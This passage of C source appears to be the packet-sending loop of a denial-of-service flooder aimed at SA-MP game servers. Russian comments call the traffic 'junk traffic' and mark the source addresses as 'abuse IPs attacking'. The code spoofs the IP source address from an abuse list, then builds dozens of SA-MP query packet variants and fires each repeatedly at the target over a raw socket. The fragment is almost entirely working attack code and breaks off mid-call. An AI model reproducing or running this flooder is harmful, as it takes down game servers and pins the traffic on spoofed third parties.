		////////////////////////////////////////////////////////////////////////////////////////////////// новый мусорный трафик про хуй прассышь че 8
		PKT->ip_header(iph); //https://youtu.be/zpzdgmqIHOQ
		udph->source = htons(7777); //порт клиента
		if (TypeGenIP == 0)
		{
			iph->saddr = list_node_abuse->adata.sin_addr.s_addr; //абуз ипы атакующие
		}
		////////////////////////////////////////////////////////////////////////////////////////////////// самп квери
		PKT->samp_m1(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_m2(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_m3(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_m4(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_m1(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_m2(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_m3(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_m4(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_arz26(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_arz27(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_arz28(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_arz29(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_arz30(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_arz31(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_arz32(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_arz33(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_arz34(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_arz35(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_arz36(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_arz37(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_arz38(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_arz39(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_arz40(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_arz41(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_arz42(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_arz43(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_arz44(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_arz45(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_arz2(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_arz3(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_arz4(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_arz5(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_arz6(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_arz7(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_arz8(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_arz9(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_arz10(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_arz11(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_arz12(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_arz13(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_arz14(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_arz15(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_arz16(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_arz17(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_arz18(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_arz19(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_arz20(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_arz21(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_arz22(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_arz23(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_arz24(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_arz25(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms22(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms23(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms24(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms25(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms26(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms27(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms28(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms29(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms30(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms31(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms32(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms22(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms23(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms24(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms25(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms26(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms27(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms28(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms29(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms30(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms31(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms32(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms22(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms23(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms24(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms25(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms26(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms27(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms28(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms29(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms30(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms31(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms32(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms18(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms19(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms20(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms21(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms18(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms19(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms20(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms21(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms18(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms19(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms20(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms21(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms18(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms19(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms20(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms21(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms18(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms19(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms20(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms21(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms18(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms19(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms20(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms21(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms18(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms19(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms20(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms21(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type1(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type2(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type3(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type4(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type5(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type6(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type7(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type8(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type9(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type10(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type11(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type12(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type13(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type14(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type15(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*) & list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type15(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type15(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type15(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type15(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type16(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type17(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type18(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms2(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms3(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms4(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms5(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms6(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms7(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms8(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms9(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms10(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms11(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms12(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms13(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms14(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms15(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms16(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type1(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type2(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type3(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type4(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type5(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type6(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type7(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type8(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type9(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type10(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type11(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type12(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type13(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type14(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type15(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type15(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type15(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type15(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type15(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type16(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type17(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type18(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms2(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms3(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms4(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms5(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms6(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms7(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms8(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms9(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms10(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms11(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms12(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms13(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms14(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms15(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms16(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type1(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type2(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type3(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type4(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type5(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type6(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type7(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type8(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type9(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type10(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type11(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type12(iph, udph);
